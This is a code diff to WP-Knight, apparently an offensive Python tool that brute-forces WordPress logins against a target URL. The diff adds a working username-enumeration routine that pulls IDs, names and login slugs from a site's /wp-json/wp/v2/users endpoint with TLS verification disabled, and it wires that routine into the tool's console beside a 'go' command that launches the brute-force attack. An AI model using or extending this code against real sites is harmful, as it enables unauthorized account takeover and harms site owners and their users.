@@ -9,8 +9,11 @@
 
 # (11/8/2018) - SSL authentication glitch fixed.
 
+# (11/9/2018) - Username enumeration/gathering feature added.
+
 # TO-DO: Add threading capability
 
+import json
 import sys
 import requests
 from tqdm import tqdm
@@ -59,11 +62,12 @@ pwd = None
 
 def console():
 	while(True):
-		cmd = raw_input(" Enter command> ")
+		cmd = raw_input(" Command > ")
 		if cmd == "help" or cmd == "?":
-			print """\n Commands:
+			print """\n [i] Commands:\n
 	url - Specify target URL ( http://website.com/wp-login.php )
 	version - Check WordPress version
+	enumerate - Gather Usernames
 	go - Activate WP-Knight
 	exit - Exit WP-Knight
 			"""
@@ -73,14 +77,20 @@ def console():
 			if login_URL == None:
 				print "\n Please specify URL \n"
 			else:		
-				print "\n WP-Knight Activated! \n"
+				print "\n [+] WP-Knight Activated! \n"
 				bruteforce()
+		elif cmd == "enumerate":
+			wpGet = raw_input("\n Enter URL ( http://website.com/ ) > ")
+			enumerate(wpGet)
 		elif cmd == "url":
 			url_config()
 		elif cmd == "version":
-			versionCheck()
+			if login_URL == None:
+				print "\n Please specify URL \n"
+			else:
+				versionCheck()
 		else:
-			print "\n Invalid Command\n"
+			print "\n [!] Invalid Command\n"
 
 def find_between( s, first, last ):
     try:
@@ -94,16 +104,50 @@ def url_config():
 	global login_URL
 	global host
 
-	login_URL = raw_input("\n Enter target URL> ")
-	print "\n Target: %s\n" % (login_URL)
-
+	login_URL = raw_input("\n Enter target URL > ")
+	print "\n [i] Target: %s\n" % (login_URL)
 
 def versionCheck():
 	global login_URL
 	headers = {'Accept-Encoding': 'identity'}
 	r = requests.get(login_URL, headers='')
 	a = find_between(r.text,"ver=","'")
-	print "\n WordPress version: %s\n" % (a)
+	print "\n [+] WordPress version: %s\n" % (a)
+
+def grab_json(base_url):
+    try:
+        url = base_url + "/wp-json/wp/v2/users"
+        r = requests.get(url, verify=False)
+    except Exception:
+        return False
+    try: # this needs replacing with a regex check
+        if "description" in r.text:
+            return r.text
+        else:
+            return False
+    except Exception:
+        return False
+
+def extract_users(the_json):
+    try:
+        var_json = json.loads(the_json)
+    except Exception, e:
+        print "\n [!] JSON Error \n"
+    try:
+        print "\n [+] Found %d users" %(len(var_json))
+        for x in range(0, len(var_json)):
+            user_id = var_json[x]['id']
+            full_name = var_json[x]['name']
+            user_name = var_json[x]['slug']
+            print " [>] User ID: %s, Name: %s, Username: %s" %(user_id, full_name, user_name)
+    except Exception:
+        print "\n [!] Username enumeration failed \n"
+
+def enumerate(wpURL):
+    json = grab_json(base_url=wpURL)
+    if json != False:
+        extract_users(the_json=json)
+    print ""
 
 def bruteforce():
 	global aPlace
@@ -172,7 +216,7 @@ def bruteforce():
 
 				except:
 
-					print "\n Connection Error \n"
+					print "\n [!] Connection Error \n"
 
 		text_file.close()
 		text_file2.close()
